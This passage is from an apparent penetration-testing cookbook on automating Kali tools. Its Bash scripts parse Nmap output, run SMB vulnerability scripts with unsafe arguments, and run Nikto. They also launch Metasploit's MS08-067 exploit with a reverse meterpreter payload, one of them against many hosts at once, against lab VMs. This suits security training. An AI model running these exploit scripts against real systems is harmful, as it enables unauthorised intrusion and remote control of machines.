<html><head></head><body>
        <section id="DRELI1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Automating Kali Tools</h1>
            

            <article>
                
<p class="calibre5">This chapter will include the following recipes:</p>
<ul class="calibre18">
<li class="calibre19">Nmap greppable output analysis</li>
<li class="calibre19">Port scanning with NMAP NSE execution</li>
<li class="calibre19">Automating vulnerability scanning with NMAP NSE</li>
<li class="calibre19">Automating web application scanning with Nikto</li>
<li class="calibre19">Multithreaded MSF exploitation with reverse shell payload</li>
<li class="calibre19">Multithreaded MSF exploitation with backdoor executable</li>
<li class="calibre19">Multithreaded MSF exploitation with ICMP verification</li>
<li class="calibre19">Multithreaded MSF exploitation with admin account creation</li>
</ul>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="DSD641-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Introduction </h1>
            

            <article>
                
<p class="calibre5">The Kali Linux penetration-testing platform offers a large number of highly effective tools to complete most of the common tasks required during an enterprise penetration test. However, there are occasions where a single tool is not sufficient to complete a given task. Rather than building entirely new scripts or programs to complete a challenging task, it is often more effective to write scripts that utilize existing tools and/or modify their behavior as needed. Common types of homegrown script that can be useful include scripts to analyze or manage the output of existing tools, stringing multiple tools together, or multithreading tasks that would otherwise have to be performed sequentially. Let's now look at various recipes for automating and manipulating existing Kali Linux tools.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="DTBMM1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Nmap greppable output analysis</h1>
            

            <article>
                
<p class="calibre5">Nmap is considered by most security professionals to be one of the most highly polished and effective tools within the Kali Linux platform. But as impressive and powerful as this tool is, comprehensive port scanning and service identification can be very time consuming. Rather than performing targeted scans against distinct service ports throughout a penetration test, it is a better approach to perform comprehensive scans of all possible TCP and UDP services and then just reference those results throughout the assessment. Nmap offers both XML and greppable output formats to aid in this process.</p>
<p class="calibre5">Ideally, you should become familiar enough with these formats that you can extract the desired information as needed from the output files. However, for reference, this recipe will provide an example script that can be used to extract all IP addresses identified to have a service running on a provided port.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="DUA781-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have Nmap output results in the greppable format. This can be achieved by performing Nmap port scans and using the <kbd class="calibre16">-oA</kbd> option to output all formats or <kbd class="calibre16">-oG</kbd> to specifically output the greppable format. In the examples provided, multiple systems were scanned on a single /24 subnet to include both Windows XP and Metasploitable2. For more information on setting up Metasploitable2, refer to the <em class="calibre15">Installing Metasploitable2</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="DV8NQ1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates the ease with which the Bash scripting language and even the Bash CLI can be used to extract information from the greppable format that can be output by Nmap:</p>
<pre class="calibre24">
#! /bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;port #&gt; &lt;filename&gt;";<br class="title-page-name"/>exit; fi<br class="title-page-name"/><br class="title-page-name"/>port=$1<br class="title-page-name"/>file=$2<br class="title-page-name"/><br class="title-page-name"/>echo "Systems with port $port open:"<br class="title-page-name"/><br class="title-page-name"/>grep $port $file | grep open | cut -d " " -f 2
</pre>
<ol class="calibre20">
<li value="1" class="calibre19">To ensure that the script's functionality is understood, we will address each line in sequence:
<ul class="calibre30">
<li class="calibre19">The first line of the script merely points to the Bash interpreter so that the script can be executed independently.</li>
<li class="calibre19">The second line of the script is an <kbd class="calibre16">if...then</kbd> conditional statement to test whether any arguments were supplied to the script. This is only minimal input validation to ensure that a script user is aware of the tool usage. If the tool is executed without any arguments supplied, the script will <kbd class="calibre16">echo</kbd> a description of its usage and then exit. The usage description requests two arguments: the port number and a filename.</li>
<li class="calibre19"> The next two lines assign each of the input values to more easily understood variables. The first input value is the port number, and the second input value is the Nmap output file.</li>
<li class="calibre19">The script will then check the Nmap greppable output file to determine what systems, if any, are running a service on the given port number:</li>
</ul>
</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00571.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">When the script is executed without any arguments, the usage description is output.</li>
<li value="3" class="calibre19">To use the script, we will need to enter a port number to check for and the filename of the Nmap-greppable output file.</li>
<li value="4" class="calibre19">In the examples provided, a scan was performed on the /24 network, and a greppable output file was generated with the filename <kbd class="calibre16">netscan.txt</kbd>.</li>
</ol>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">The script was then used to analyze this file and to determine whether any hosts were found within that had active services on various ports:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00472.jpeg"/></div>
<p class="calibre5">In the examples shown, the script was run to determine hosts that were running on ports <kbd class="calibre16">80</kbd>, <kbd class="calibre16">22</kbd>, and <kbd class="calibre16">445</kbd>. The output of the script declares the port number that is being evaluated and then lists the IP address of any system in the output file that had an active service running  on that port.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E078C1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">The <kbd class="calibre16">grep</kbd> command is a highly functional command-line utility that can be used in Bash to extract specific content from the output or from a given file. In the script provided in this recipe, the <kbd class="calibre16">grep</kbd> command is used to extract, from the Nmap greppable output file, any instances of the given port number. Because the output from the <kbd class="calibre16">grep</kbd> function includes multiple pieces of information, the output is then piped over to the <kbd class="calibre16">cut</kbd> function to extract the IP addresses and then output them to the terminal.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E15OU1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Port scanning with NMAP NSE execution</h1>
            

            <article>
                
<p class="calibre5">Many of the <strong class="calibre1">Nmap Scripting Engine</strong> (<strong class="calibre1">NSE</strong>) scripts are only applicable if there is a service running on a given port. Consider the usage of the following scripts:</p>
<ul class="calibre18">
<li class="calibre19"><kbd class="calibre16">smb-vuln-conficker</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-cve2009-3103</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-ms06-025</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-ms07-029</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-regsvc-dos</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-ms08-067</kbd></li>
</ul>
<p class="calibre5">These scripts will evaluate SMB services running on TCP port <kbd class="calibre16">445</kbd> for common service vulnerabilities. If these scripts were executed across an entire network, it would have to redo the task of determining whether port <kbd class="calibre16">445</kbd> is open and whether the SMB service is accessible on each target system. This is a task that has probably already been accomplished during the scanning phase of the assessment. Bash scripting can be used to leverage existing Nmap greppable output files to run service-specific NSE scripts only against systems that are running those services. In this recipe, we will demonstrate how a script can be used to determine hosts  that are running a service on TCP <kbd class="calibre16">445</kbd> from previous scan results and then run the previously mentioned scripts against only those systems.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E249G1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have Nmap output results in the greppable format. This can be achieved by performing Nmap port scans and using the <kbd class="calibre16">-oA</kbd> option to output all formats or <kbd class="calibre16">-oG</kbd> to specifically output the greppable format. In the examples provided, multiple systems were scanned on a single /24 subnet and included multiple Windows systems running the SMB service. For more information on setting up Windows systems, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem by using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E32Q21-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how a Bash script can be used to sequence multiple tasks together. In this case, the analysis of an Nmap greppable output file is performed, and then the information identified by that task is used to execute an NSE script against distinct systems. Specifically, the first task will determine what systems are running a service on TCP port <kbd class="calibre16">445</kbd> and will then run the following scripts against each of those systems:</p>
<ul class="calibre18">
<li class="calibre19"><kbd class="calibre16">smb-vuln-conficker</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-cve2009-3103</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-ms06-025</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-ms07-029</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-regsvc-dos</kbd></li>
<li class="calibre19"><kbd class="calibre16">smb-vuln-ms08-067</kbd></li>
</ul>
<p class="calibre5">Let's examine the following Bash script:</p>
<pre class="calibre24">
#! /bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;file&gt;"; exit; fi<br class="title-page-name"/><br class="title-page-name"/>file=$1<br class="title-page-name"/><br class="title-page-name"/>for x in $(grep open $file | grep 445 | cut -d " " -f 2); <br class="title-page-name"/>do <br class="title-page-name"/> nmap --script smb-vuln-conficker.nse -p 445 $x --script-args=unsafe=1;<br class="title-page-name"/> nmap --script smb-vuln-cve2009-3103.nse -p 445 $x --script-args=unsafe=1;<br class="title-page-name"/> nmap --script smb-vuln-ms06-025.nse -p 445 $x --script-args=unsafe=1;<br class="title-page-name"/> nmap --script smb-vuln-ms07-029.nse -p 445 $x --script-args=unsafe=1;<br class="title-page-name"/> nmap --script smb-vuln-regsvc-dos.nse -p 445 $x --script-args=unsafe=1;<br class="title-page-name"/> nmap --script smb-vuln-ms08-067.nse -p 445 $x --script-args=unsafe=1;<br class="title-page-name"/>done
</pre>
<ol class="calibre20">
<li value="1" class="calibre19">To ensure that the functionality of the script is understood, we will address each line in sequence:
<ul class="calibre30">
<li class="calibre19">The first few lines are similar to the script that was discussed in the previous recipe. The first line points to the Bash interpreter, the second line checks that arguments are provided, and the third line assigns input values to easily understood variable names.</li>
<li class="calibre19">The body of the script is quite different though. A <kbd class="calibre16">for</kbd> loop is used to cycle through a list of IP addresses that is acquired by means of a <kbd class="calibre16">grep</kbd> function. The list of IP addresses output from the <kbd class="calibre16">grep</kbd> function corresponds to all systems that have a service running on TCP port <kbd class="calibre16">445</kbd>. For each of these IP addresses, the NSE script is then executed.</li>
<li class="calibre19">By only running this script on systems that had previously been identified to have a service running on TCP port <kbd class="calibre16">445</kbd>, the time required to run the NSE scan is drastically reduced:</li>
</ul>
</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00575.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">By executing the script without any arguments, the script will output the usage description. This description indicates that the filename of an existing Nmap greppable output file should be supplied. When the Nmap output file is supplied, the script quickly analyzes the file to find any systems with a service on TCP port <kbd class="calibre16">445</kbd>, then runs the NSE scripts on each of those systems, and outputs the results to the terminal:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00610.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">Scrolling through the terminal output, we can see that the target machine is vulnerable to the MS08-67 exploit:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00622.jpeg"/></div>
<p class="calibre5">In the example provided, the script is passed to the <kbd class="calibre16">netscan.txt</kbd> output file. After a quick analysis of the file, the script determines that two systems are running services on port <kbd class="calibre16">445</kbd>. Each of these services was then scanned with the scripts listed before, and the output was generated in the terminal.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E41AK1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">By supplying the grep sequence as the value to be used by the <kbd class="calibre16">for</kbd> loop, the Bash script in this recipe is essentially just looping through the output from that function. By running that function independently, one can see that it just extracts a list of IP addresses that correspond to hosts running the SMB service. The <kbd class="calibre16">for</kbd> loop then cycles through these IP addresses and executes the NSE script for each.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E4VR61-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Automate vulnerability scanning with NSE</h1>
            

            <article>
                
<p class="calibre5">There may also be occasions where it might be helpful to develop a script that combines vulnerability scanning with exploitation. Let's say we want to scan a group of machines for a specific exploit and then, if found, run that exploit against the vulnerable machine(s). Vulnerability scanning can often turn up false positives, so by performing subsequent exploitation of vulnerability scan findings, one can have immediate validation of the legitimacy of those findings. In this recipe, a Bash script will be used to execute the <kbd class="calibre16">smb-vuln-ms08-067.nse</kbd> script to determine whether a host is vulnerable to the MS08-067 NetAPI exploit, and if the NSE script indicates that it is, Metasploit will be used to automatically attempt to exploit it for verification.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E5UBO1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have access to a system that is running a vulnerable service that can be identified using an NSE script and exploited with Metasploit. In the example provided, a Windows XP system running an SMB service that is vulnerable to the MS08-067 NetAPI exploit is used. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15"> Getting Started</em>. Additionally, this section will require a script to be written to the filesystem by using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E6SSA1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how a Bash script can be used to sequence together the tasks of vulnerability scanning and target exploitation. In this case, the <kbd class="calibre16">smb-vuln-ms08-067.nse</kbd> script is used to determine whether a system is vulnerable to the MS08-067 attack,  and then the corresponding Metasploit exploit is executed against the system if it is found  to be vulnerable:</p>
<pre class="calibre24">
#! /bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;RHOST&gt; &lt;LHOST&gt; &lt;LPORT&gt;"; exit; fi<br class="title-page-name"/><br class="title-page-name"/>rhost=$1<br class="title-page-name"/>lhost=$2<br class="title-page-name"/>lport=$3<br class="title-page-name"/><br class="title-page-name"/>nmap --script smb-vuln-ms08-067.nse -p 445 $rhost --script-args=unsafe=1 -oN tmp_output.txt<br class="title-page-name"/>if grep -q VULNERABLE: tmp_output.txt; <br class="title-page-name"/> then echo "$rhost appears to be vulnerable, exploiting with Metasploit...";<br class="title-page-name"/> msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST $rhost; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"<br class="title-page-name"/>fi<br class="title-page-name"/>rm tmp_output.txt
</pre>
<ol class="calibre20">
<li value="1" class="calibre19">To ensure that the script's functionality is understood, we will address each line in sequence:
<ul class="calibre30">
<li class="calibre19">The first few lines in the script are the same as the scripts previously discussed in this chapter. The first line defines the interpreter, the second line tests for input, and the third, fourth, and fifth lines are all used to define the variables based on user input.</li>
<li class="calibre19">In this script, the supplied user variables correspond to the variables that are used in Metasploit. The <kbd class="calibre16">RHOST</kbd> variable should define the IP address of the target, the <kbd class="calibre16">LHOST</kbd> variable should define the IP address of the reverse listener, and the <kbd class="calibre16">LPORT</kbd> variable should define the local port that is listening.</li>
<li class="calibre19">The first task that the script then performs in the body is to execute the <kbd class="calibre16">smb-vuln-ms08-067.nse</kbd> script against the IP address of the target system, as defined by the <kbd class="calibre16">RHOST</kbd> input.</li>
<li class="calibre19">The results of this are then output in normal format to a temporary text file.</li>
<li class="calibre19">An <kbd class="calibre16">if...then</kbd> conditional statement is then used in conjunction with a <kbd class="calibre16">grep</kbd> function to test the output file for a unique string that would indicate that the system is vulnerable. If the unique string is discovered, the script will indicate that the system appears to be vulnerable and will then execute the Metasploit exploit and meterpreter payload using <kbd class="calibre16">msfconsole -x</kbd>.</li>
<li class="calibre19">Finally, after the exploit is launched, the temporary Nmap output file is removed from the filesystem using the <kbd class="calibre16">rm</kbd> function. The <kbd class="calibre16">test_n_xploit.sh</kbd> Bash command is executed as follows:</li>
</ul>
</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00632.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">If the script is executed without supplying any arguments, it will output the appropriate usage. This usage description will indicate that the script should be executed with the arguments <kbd class="calibre16">RHOST</kbd>, <kbd class="calibre16">LHOST</kbd>, and <kbd class="calibre16">LPORT</kbd>, in that order. These input values will be used for both the NSE vulnerability scan and, if warranted, the execution of the exploit on the target system using Metasploit.</li>
<li value="3" class="calibre19">In the following example, the script is used to determine whether the host at IP address <kbd class="calibre16">172.16.69.129</kbd> is vulnerable. If the system is determined to be vulnerable, then the exploit will be launched and connected to a reverse TCP meterpreter handler that is listening on the system at IP address <kbd class="calibre16">172.16.69.133</kbd> on the TCP port <kbd class="calibre16">4444</kbd>:</li>
</ol>
<div class="p"><img class="alignnone391" src="../images/00643.jpeg"/></div>
<p class="calibre5">The preceding output shows that immediately upon completion of the NSE script, the Metasploit exploit module is executed, and an interactive meterpreter shell is returned on  the target system.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E7RCS1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">The <kbd class="calibre16">msfconsole -x</kbd> command can be used to execute  single-line commands directly from the terminal rather than working within an interactive console. This makes it an excellent feature for use within Bash shell scripting. As both NSE scripts and <kbd class="calibre16">msfconsole -x</kbd> can be executed from the Bash terminal, a shell script can easily be written to combine the two functions together.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E8PTE1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Automate web application scanning with Nikto</h1>
            

            <article>
                
<p class="calibre5">Nikto is a command-line tool in Kali Linux that can be used to evaluate a web application for known security issues. In the scanning phase of the assessment, we already determined hosts running web services with Nmap. Bash scripting can be used to leverage existing Nmap greppable output files to run Nikto only against systems that are running web services. In this recipe, we will demonstrate how a script can be used to determine hosts  that are running a service on TCP port <kbd class="calibre16">80</kbd> from previous scan results and then run Nikto against only those systems.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="E9OE01-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have access to systems running web services. In the example provided, there are two boxes running Metasploitable and two running Windows XP. For more information on setting up Metasploitable and Windows XP systems, refer to the <em class="calibre15">Installing Metasploitable2</em> and <em class="calibre15">Installing Windows server</em> recipes in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>,  <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem by using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EAMUI1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it...</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how we can use the Bash scripting language to extract information from Nmap's greppable format. We then use that information to run Nikto against hosts running web services:</p>
<pre class="calibre24">
#! /bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;file&gt;"; exit; fi<br class="title-page-name"/>file=$1<br class="title-page-name"/><br class="title-page-name"/>for x in $(grep open $file | grep 80 | cut -d " " -f 2); <br class="title-page-name"/>do <br class="title-page-name"/>      echo "Nikto scanning the following host: $x" <br class="title-page-name"/>      nikto -h $x -F text -output /tmp/nikto-scans/$x.txt<br class="title-page-name"/>done
</pre>
<ol class="calibre20">
<li value="1" class="calibre19">To ensure that the functionality of the script is understood, we will address each line in sequence:
<ul class="calibre30">
<li class="calibre19">The first few lines are similar to scripts that were discussed in previous recipes. The first line points to the Bash interpreter, the second line checks that arguments are provided, and the third line assigns input values to easily understood variable names.</li>
<li class="calibre19">A <kbd class="calibre16">for</kbd> loop is used to cycle through a list of IP addresses that is acquired by means of a <kbd class="calibre16">grep</kbd> function. The list of IP addresses output from the <kbd class="calibre16">grep</kbd> function corresponds to all systems that have a service running on TCP port <kbd class="calibre16">80</kbd>.</li>
<li class="calibre19">For each of these IP addresses, we run a Nikto scan and output the results to the <kbd class="calibre16">/tmp/nikto-scans/ directory</kbd>.  </li>
<li class="calibre19">A different output report will be written for each host; to avoid naming conflicts, we'll name the output file with the IP address of the target machine. The only thing left to do is to create the <kbd class="calibre16">nikto-scans</kbd> directory:</li>
</ul>
</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00249.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">By executing the script without any arguments, the script will output the usage description. This description indicates that a filename of an existing Nmap greppable output file should be supplied. When the Nmap output file is supplied, the script quickly analyzes the file to find any systems with a service on TCP port <kbd class="calibre16">80</kbd>, then runs Nikto scans on each of those systems, and writes the output to the terminal and the <kbd class="calibre16">/tmp/nikto-scans/</kbd> directory:</li>
</ol>
<div class="p"><img class="alignnone392" src="../images/00659.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">We can now navigate to the <kbd class="calibre16">/tmp/nikto-scans/</kbd> directory and view the files created by Nikto for each host scanned:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00640.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">Examining the report for <kbd class="calibre16">172.16.669.128</kbd>, we find Nikto's findings:</li>
</ol>
<div class="p"><img class="alignnone393" src="../images/00241.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">In the example provided, the script is passed to the <kbd class="calibre16">netscan.txt</kbd> output file. After a quick analysis of the file, the script determines that four systems are running services on port <kbd class="calibre16">80</kbd>. Each of these services is then scanned with Nikto and the results are output to the terminal and to a file for each host:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00640.jpeg"/></div>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EBLF41-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works...</h1>
            

            <article>
                
<p class="calibre5">By supplying the grep sequence as the value to be used by the <kbd class="calibre16">for</kbd> loop, the Bash script in this recipe is essentially just looping through the output from that function. By running that function independently, one can see that it just extracts a list of IP addresses that correspond to hosts running web services. The <kbd class="calibre16">for</kbd> loop then cycles through these IP addresses and runs a Nikto scan for each.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="ECJVM1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Multithreaded MSF exploitation with reverse shell payload</h1>
            

            <article>
                
<p class="calibre5">One of the difficulties of performing a large penetration test using the Metasploit framework is that each exploit must be run individually and in sequence. In cases where you would like to confirm the exploitability of a single vulnerability across a large number of systems, the task of individually exploiting each one can become tedious and overwhelming. Fortunately, by combining the power of MSFCLI and Bash scripting, one can easily execute exploits on multiple systems simultaneously by running a single script. This recipe will demonstrate how to use Bash to exploit a single vulnerability across multiple systems and open a meterpreter shell for each.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EDIG81-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have access to multiple systems that each have the same vulnerability that can be exploited with Metasploit. In the example provided, a VM running a vulnerable version of Windows XP was copied to generate three instances of the MS08-067 vulnerability. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EEH0Q1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how a Bash script can be used to exploit multiple instances of a single vulnerability simultaneously. This script in particular can be used to exploit multiple instances of the MS08-067 NetAPI vulnerability by referencing an input  list of IP addresses:</p>
<pre class="calibre24">
#!/bin/bash<br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;host file&gt; &lt;LHOST&gt;"; exit; fi<br class="title-page-name"/>iplist=$1<br class="title-page-name"/>lhost=$2<br class="title-page-name"/><br class="title-page-name"/>i=4444<br class="title-page-name"/>for ip in $(cat $iplist)<br class="title-page-name"/>do<br class="title-page-name"/>       gnome-terminal -x msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST $ip; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $i; run"<br class="title-page-name"/> echo "Exploiting $ip and establishing reverse connection on local port $i"<br class="title-page-name"/>i=$(($i+1))<br class="title-page-name"/>done
</pre>
<ol class="calibre20">
<li value="1" class="calibre19">The script uses a <kbd class="calibre16">for</kbd> loop to execute a specific task for each IP address listed in the input text file. That specific task consists of launching a new GNOME terminal that in turn executes the <kbd class="calibre16">msfconsole -x</kbd> command that is necessary to exploit that particular system and then launch a reverse TCP meterpreter shell. Because the <kbd class="calibre16">for</kbd> loop launches a new GNOME terminal for each <kbd class="calibre16">msfconsole</kbd> exploit, each one is executed as an independent process. In this way, multiple processes can be running in parallel, and each target will be exploited simultaneously.</li>
<li value="2" class="calibre19">The local port value is initialized at the value of <kbd class="calibre16">4444</kbd> and is incremented by <kbd class="calibre16">1</kbd> for each additional system that is exploited so that each meterpreter shell connects to a distinct local port. Because each process is executed in an independent shell, this script will need to be executed from the graphical desktop interface rather than over an SSH connection.</li>
<li value="3" class="calibre19">The <kbd class="calibre16">./multipwn.sh</kbd> Bash shell can be executed as follows:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00315.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">If the script is executed without supplying any arguments, the script will output the appropriate usage. This usage description will indicate that the script should be executed with an <kbd class="calibre16">LHOST</kbd> variable to define the listening IP system and the filename for a text file containing a list of target IP addresses.</li>
<li value="5" class="calibre19">Once executed with these arguments, a series of new terminals will begin popping up. Each of these terminals will run the exploitation sequence of one of the IP addresses in the input list.</li>
<li value="6" class="calibre19">The original execution terminal will output a list of processes as they are executed. In the example provided, three distinct systems are exploited, and a separate terminal is opened for each.</li>
</ol>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">An example of one of the terminals is as follows:</li>
</ol>
<div class="p"><img class="alignnone394" src="../images/00401.jpeg"/></div>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">Each individual terminal launches a separate instance of msfconsole and launches the exploit. Assuming the exploit is successful, the payload will be executed, and an interactive meterpreter shell will be available in each separate terminal.</li>
</ol>


            </article>

